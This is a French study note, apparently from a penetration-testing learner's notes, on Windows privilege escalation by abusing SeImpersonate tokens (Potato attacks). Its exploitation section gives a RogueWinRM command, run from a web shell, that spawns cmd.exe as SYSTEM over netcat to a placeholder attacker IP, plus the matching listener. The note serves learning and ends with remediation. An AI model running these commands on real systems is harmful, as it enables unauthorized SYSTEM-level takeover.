---
technique: "SeImpersonate / SeAssignPrimaryToken (Potato attacks)"
os: Windows
categorie: PrivEsc
tags: [technique, privesc, windows, token]
rooms: []
---

# SeImpersonate / SeAssignPrimaryToken

## Principe
> Ces privilèges permettent à un process d'**emprunter le jeton d'accès (access token)** d'un autre user et d'agir en son nom (impersonation). Si on contrôle un process qui a ce privilège, on peut usurper le jeton de **n'importe quel user qui s'y connecte**, y compris SYSTEM.

## Analogie FTP
> Un serveur FTP avec impersonation emprunte le jeton d'Ann à sa connexion pour n'accéder qu'à SES fichiers — l'OS gère les droits. Côté attaquant : si je pilote ce process, j'usurpe le jeton du user qui se connecte.

## Qui a ce privilège par défaut
- `LOCAL SERVICE`, `NETWORK SERVICE`
- `iis apppool\defaultapppool` (IIS) → compromettre un site IIS donne souvent `SeImpersonate`.

## Vérifier
```cmd
whoami /priv
:: chercher SeImpersonatePrivilege = Enabled
```

## Exploitation — RogueWinRM
> Astuce : démarrer le service **BITS** crée une connexion vers le port **5985** (WinRM) en tant que **SYSTEM**. Si WinRM ne tourne pas, on lance un faux WinRM qui capture cette auth SYSTEM.

```bash
# Kali : listener
nc -lvp 4442
```
```cmd
:: Windows (web shell) : déclencher l'exploit
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe MON_IP 4442"
```
→ shell **nt authority\system**.

## Pièges
- Peut prendre **jusqu'à 2 min** (attente du service BITS) — le navigateur/web shell semble figé, c'est normal.
- Lancer le `nc` **avant**, et mettre **MON IP**.
- Famille "Potato" : JuicyPotato, PrintSpoofer, GodPotato selon la version de Windows.

## Remédiation
- Retirer SeImpersonate des comptes de service non nécessaires ; patcher.
